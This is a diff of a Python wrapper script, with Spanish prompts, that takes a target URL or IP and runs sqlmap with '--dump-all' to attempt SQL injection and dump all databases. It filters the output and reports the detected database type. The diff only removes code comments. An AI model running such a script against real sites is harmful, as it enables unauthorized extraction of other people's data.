@@ -3,14 +3,12 @@ import re
 
 def print_relevant_line(line):
     """Prints relevant lines and summarizes key information."""
-    # Define patterns to include
     include_patterns = [
         r"database", r"banner", r"current user", r"current db", r"is dba",
         r"available databases", r"available tables", r"column name", r"entry",
         r"dumping", r"starting", r"data", r"WARNING", r"ERROR"
     ]
 
-    # Define patterns to ignore
     ignore_patterns = [
         r"INFO", r"legal disclaimer"
     ]
@@ -26,13 +24,9 @@ def print_relevant_line(line):
         if re.search(pattern, line, re.IGNORECASE):
             return
     
-    # Print the line if it does not match any ignore pattern
     print(line, end='')
 
-# Get the target URL or IP
 url = input("Inserte la URL o IP que quiere escanear: ")
-
-# Display the start message
 print("\nHemos iniciado el proceso de SQL injection...\n")
 
 # Define the sqlmap command
@@ -43,7 +37,6 @@ command = [
     "--dump-all", "--threads=5"
 ]
 
-# Run the sqlmap command
 process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
 # Initialize flags and counters
@@ -51,10 +44,8 @@ db_detected = False
 warnings = []
 errors = []
 for line in process.stdout:
-    # Print only relevant lines
     print_relevant_line(line)
     
-    # Check for database type and print a message if detected
     if not db_detected:
         if re.search(r"Oracle", line, re.IGNORECASE):
             print("\nHemos detectado una base de datos Oracle")
@@ -69,7 +60,6 @@ for line in process.stdout:
             print("\nHemos detectado una base de datos Microsoft SQL Server")
             db_detected = True
 
-    # Collect warnings and errors for summary
     if re.search(r"\[WARNING\]", line):
         warnings.append(line.strip())
     if re.search(r"\[ERROR\]", line):
